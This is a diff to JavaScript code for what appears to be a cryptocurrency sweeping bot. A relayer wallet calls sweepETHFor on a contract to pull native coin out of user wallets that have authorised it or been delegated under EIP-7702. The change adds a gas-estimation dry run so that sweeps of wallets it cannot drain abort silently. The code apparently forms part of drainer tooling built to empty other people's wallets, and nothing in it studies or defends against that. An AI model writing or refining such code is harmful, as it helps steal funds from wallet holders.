@@ -1341,8 +1341,12 @@ async function dispatchSweep(wallet) {
 
 // ── Native coin sweep helper for non-EIP7702 wallets ─────────────────────────
 // Calls sweepETHFor(user) on the V2.1 TCN contract if the user holds native
-// coin and the contract is authorised. No-ops gracefully if the contract is
-// not configured, balance is zero, or the call reverts.
+// coin and the contract is authorised.
+//
+// IMPORTANT: sweepETHFor() can only move native coin if the V2.1 contract has
+// a mechanism to pull BNB from an EOA. We use estimateGas() as a dry-run:
+// if it reverts the call would fail on-chain so we skip the broadcast — no
+// wasted relayer gas, no failed tx.
 
 async function trySweepNativeFor(checksum, short) {
   if (!contract || !CONTRACT_ADDRESS) return;
@@ -1356,15 +1360,25 @@ async function trySweepNativeFor(checksum, short) {
       return;
     }
 
-    log(`[nativeFor] ${short} — native balance ${ethers.formatEther(nativeBal)} — attempting sweepETHFor`);
+    log(`[nativeFor] ${short} — native balance ${ethers.formatEther(nativeBal)} — dry-run sweepETHFor`);
     const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
     if (!isAuth) {
       log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
       return;
     }
 
+    // Dry-run first — if estimateGas reverts the call would fail on-chain.
+    // Non-EIP7702 EOAs cannot have native coin pulled by a contract, so this
+    // will revert for most wallets. Abort silently to avoid wasting relayer gas.
+    let gasEst;
+    try {
+      gasEst = await contract.sweepETHFor.estimateGas(checksum);
+    } catch (simErr) {
+      log(`[nativeFor] ${short} — sweepETHFor simulation reverted (non-delegated EOA) — skipping`);
+      return;
+    }
+
     const fee = await getFeeData();
-    const gasEst = await contract.sweepETHFor.estimateGas(checksum).catch(() => 80_000n);
     const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
     await tx.wait();
     log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
